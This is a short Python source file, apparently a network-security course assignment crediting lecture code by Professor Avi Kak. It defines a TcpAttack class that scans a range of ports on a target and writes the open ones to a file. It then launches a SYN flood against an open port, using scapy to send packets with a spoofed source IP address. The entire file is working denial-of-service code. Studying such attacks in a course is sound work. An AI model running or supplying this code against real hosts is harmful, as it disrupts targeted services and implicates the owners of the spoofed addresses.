import socket
from scapy.all import IP, TCP, send, RandShort
########################################################################
'''
CITATION: Lecture 16 code by Professor Avi Kak
'''
########################################################################

class TcpAttack():

    def __init__(self, spoofIP:str, targetIP:str)->None:
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []

    # spoofIP: String containing the IP address to spoof
    def scanTarget(self,rangeStart:int,rangeEnd:int)->None:
    # rangeStart: Integer designating the first port in the range of ports being scanned
    # rangeEnd: Integer designating the last port in the range of ports being scanned
    # return value: no return value, however, writes open ports to openports.txt
        f = open("openports.txt", 'w')

        for port in range(rangeStart, rangeEnd + 1):
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, port))
                f.write(str(port))
                f.write("\n")
                self.open_ports.append(port)
            except:
                pass

        f.close()

    def attackTarget(self,port:int,numSyn:int)->int:
    # port: integer designating the port that the attack will use
    # numSyn: Integer of Syn packets to send to target IP address at the given port
    # If the port is open, perform a DoS attack and return Otherwise return 0
        if port not in self.open_ports:
            print("Port not open")
            return 0
        for i in range(numSyn):
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header
            try:
                send(packet) 
            except Exception as e:
                print(e)
        return 1
    
#if __name__ == "__main__":
# Construct an instance of the TcpAttack class and perform scanning and SYN Flood Attack
